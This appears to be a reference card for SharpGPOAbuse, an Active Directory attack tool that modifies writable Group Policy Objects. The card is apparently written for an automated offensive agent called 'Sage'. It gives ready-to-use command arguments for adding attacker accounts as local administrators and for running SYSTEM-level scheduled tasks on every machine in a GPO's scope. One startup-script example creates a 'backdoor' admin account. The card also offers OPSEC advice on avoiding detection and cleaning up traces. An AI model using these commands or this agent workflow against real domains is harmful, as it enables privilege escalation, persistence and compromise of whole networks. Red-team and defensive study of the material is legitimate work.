---
name: SharpGPOAbuse
category: acl-abuse
subcategories: [gpo-abuse, code-execution, local-admin-add]
tradecraft_tags: [gpo, group-policy, code-exec, privilege-escalation, acl-abuse]
mitre_attack:
  - id: T1484.001
    name: Domain Policy Modification — Group Policy Modification
source:
  url: https://github.com/FSecureLABS/SharpGPOAbuse
  license: MIT
  maintained: false
binary_type: .net-assembly
binary_filename: SharpGPOAbuse.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  GPO modification is logged in the SYSVOL share (file writes) and generates AD events
  (Event 5136 on DC). Group Policy client-side processing on target machines generates
  Event 4739 (GPO applied) and other policy change events. SYSVOL replication propagates
  changes within the replication interval. MDI detects GPO modification by non-admin
  principals. DFSR replication metadata is also an artifact.
usage_examples:
  - description: Add a user to local administrators via GPO
    args: "--AddLocalAdmin --UserAccount attacker --GPOName VulnerableGPO"
  - description: Add a scheduled task to GPO (runs as SYSTEM on targets)
    args: "--AddComputerTask --TaskName 'SysUpdate' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c whoami > C:\\Windows\\Temp\\out.txt' --GPOName VulnerableGPO"
  - description: Add a user-run scheduled task (runs in user context)
    args: "--AddUserTask --TaskName 'UpdateCheck' --Author 'NORTH\\jon.snow' --Command 'cmd.exe' --Arguments '/c calc.exe' --GPOName VulnerableGPO"
  - description: Add a startup/shutdown script to GPO
    args: "--AddComputerScript --ScriptName update.bat --ScriptContents 'net user backdoor P@ss123! /add && net localgroup administrators backdoor /add' --GPOName VulnerableGPO"
  - description: Add user rights (SeDebugPrivilege) via GPO
    args: "--AddUserRights --UserRights SeDebugPrivilege --UserAccount attacker --GPOName VulnerableGPO"
opsec_notes: |
  GPO modifications are persistent — the change remains until manually reverted or
  the GPO is deleted. Every machine in the GPO's scope will receive the modification
  at the next Group Policy refresh (default 90 minutes ± 30 minute jitter; immediate
  with `gpupdate /force`). SYSVOL writes generate file-system audit events if enabled.
  MDI has detection for non-admin GPO modifications. Clean up GPO modifications after
  achieving the objective to avoid long-lasting artifacts.
gotchas: |
  SharpGPOAbuse requires GenericWrite or GpoEditDeleteModifySecurity over the target GPO
  object — not just on the OU. Verify the correct GPO name (as it appears in AD, not
  the display name in GPMC) and that the GPO is linked to a scope that includes target
  machines. If the GPO is linked but not enforced, link order and inheritance blocking
  can prevent it from applying. Scheduled task command execution is as SYSTEM — use for
  privilege escalation, not lateral movement with user context. Cleanup: remove the
  added element from the GPO after exploitation. The project is not actively maintained
  (last commit ~2020) — test in lab before relying on it against newer Windows.
related_ttps: [sharphound, whisker, standin, sharpup]
alternatives: [grouper2, powersploit-gpo, manual-gpo-edit]
common_args:
  --AddLocalAdmin:
    description: Add a user to the local Administrators group via GPO
    typical_values: [flag-only]
  --AddComputerTask:
    description: Add a scheduled task that runs as SYSTEM on all computers in GPO scope
    typical_values: [flag-only]
  --AddUserTask:
    description: Add a scheduled task that runs in user context
    typical_values: [flag-only]
  --AddComputerScript:
    description: Add a computer startup/shutdown script
    typical_values: [flag-only]
  --AddUserRights:
    description: Add a privilege to a user via GPO User Rights Assignment
    typical_values: [flag-only]
  --GPOName:
    description: Name of the GPO to modify (must match AD GPO display name)
    typical_values: ["Default Domain Policy", "VulnerableGPO"]
    required: true
  --UserAccount:
    description: Target user account for LocalAdmin or UserRights operations
    typical_values: ["attacker", "NORTH\\\\attacker"]
  --TaskName:
    description: Display name for the scheduled task
    typical_values: ["SysUpdate", "WindowsMaint"]
  --Command:
    description: Command to execute in scheduled task or script
    typical_values: ["cmd.exe", "powershell.exe"]
  --Arguments:
    description: Arguments for the command
    typical_values: ["/c whoami > C:\\\\Windows\\\\Temp\\\\out.txt"]
last_updated: 2026-05-29
---

# SharpGPOAbuse

FSecureLABS' tool for exploiting misconfigured Group Policy Object (GPO) permissions.
When SharpHound identifies a controlled principal with write access to a GPO object
(GenericWrite, GpoEditDeleteModifySecurity, or WriteDACL), SharpGPOAbuse modifies the
GPO to achieve code execution or privilege escalation on all machines in the GPO's linked
scope. The most common attack patterns are adding a local administrator or adding a
SYSTEM-level scheduled task.

## Typical use cases
- Add an attacker account to local Administrators on all machines in GPO scope
- Execute arbitrary commands as SYSTEM via a GPO scheduled task
- Add dangerous privileges (SeDebugPrivilege, SeImpersonatePrivilege) to a user
- Add a startup/shutdown script with persistent backdoor
- Pivot from GenericWrite on a GPO to code execution on every machine in the scope

## How Sage uses this
SharpGPOAbuse is triggered by SharpHound-identified ACL paths: when SharpHound shows a
controlled principal with write rights over a GPO linked to a high-value target (e.g. a
GPO linked to the Domain Controllers OU, or to a machine hosting a service account),
Sage uses SharpGPOAbuse to add a local admin or scheduled task. The scheduled task
callback gives Sage SYSTEM-level access on all machines in scope. For scoped impact,
Sage prefers the local admin add (less noise than a new scheduled task running every hour).

## Output
Text confirmation to stdout indicating success or failure of the GPO modification.
Example: `[+] Local admin entry successfully added!`. The actual effect (local admin
membership, scheduled task execution) occurs when Group Policy refreshes on target machines
(up to 2 hours for background refresh; immediate with `gpupdate /force` from SYSTEM).

## OPSEC considerations
GPO modifications are persistent and affect ALL machines in the GPO's scope — be surgical
about which GPO you target. Broad-scope GPOs (e.g. "Default Domain Policy") will write
to every machine in the domain, creating massive forensic artifacts. Prefer GPOs linked
to specific OUs. Remove modifications immediately after use. The change will persist until
the next background Group Policy refresh on targets even after you clean up the GPO — plan
accordingly.

## Full Reference

> Captured against SharpGPOAbuse v1.0, 2026-05-29. Source: https://github.com/FSecureLABS/SharpGPOAbuse README.

### Available attack modes

| Mode | Effect |
|------|--------|
| `--AddLocalAdmin` | Adds user to local Administrators group on all machines in scope |
| `--AddComputerTask` | Adds a computer-context (SYSTEM) scheduled task to the GPO |
| `--AddUserTask` | Adds a user-context scheduled task (runs as the logged-on user) |
| `--AddComputerScript` | Adds a startup/shutdown script to the GPO |
| `--AddUserScript` | Adds a logon/logoff script to the GPO |
| `--AddUserRights` | Modifies User Rights Assignment (adds/removes privileges) |

### Argument listing by mode

#### AddLocalAdmin
| Arg | Description |
|-----|-------------|
| `--UserAccount X` | User (DOMAIN\user or just user) to add |
| `--GPOName X` | Target GPO name |

#### AddComputerTask
| Arg | Description |
|-----|-------------|
| `--TaskName X` | Task display name |
| `--Author X` | Author field (use `NT AUTHORITY\SYSTEM`) |
| `--Command X` | Executable path |
| `--Arguments X` | Command arguments |
| `--GPOName X` | Target GPO name |
| `--Scope X` | computer or user (default: computer) |
| `--RunAs X` | Run as this user (for user-scope tasks) |
| `--Force` | Force even if task already exists |

#### AddUserRights
| Arg | Description |
|-----|-------------|
| `--UserRights X` | Privilege constant (e.g. SeDebugPrivilege, SeImpersonatePrivilege) |
| `--UserAccount X` | User to receive the right |
| `--GPOName X` | Target GPO name |

### GPO permission requirements

- `GenericWrite` — full write access to GPO
- `GpoEditDeleteModifySecurity` — explicitly grants GPO edit permission
- `WriteDACL` — allows self-granting write permissions first

Use SharpHound's BloodHound output to identify principals with these rights on GPO objects.

### Group Policy refresh timing

- Background refresh: every 90 minutes ± 30 minute jitter (default)
- For immediate application: `gpupdate /force` on each target (requires access)
- DC policy refresh: every 5 minutes
- Reboot: always applies policy on next boot

### Source for this reference

- https://github.com/FSecureLABS/SharpGPOAbuse (README)
- FSecureLABS blog: https://labs.f-secure.com/tools/sharpgpoabuse/
- Version: v1.0 as of 2026-05-29 (unmaintained; test against target Windows version)
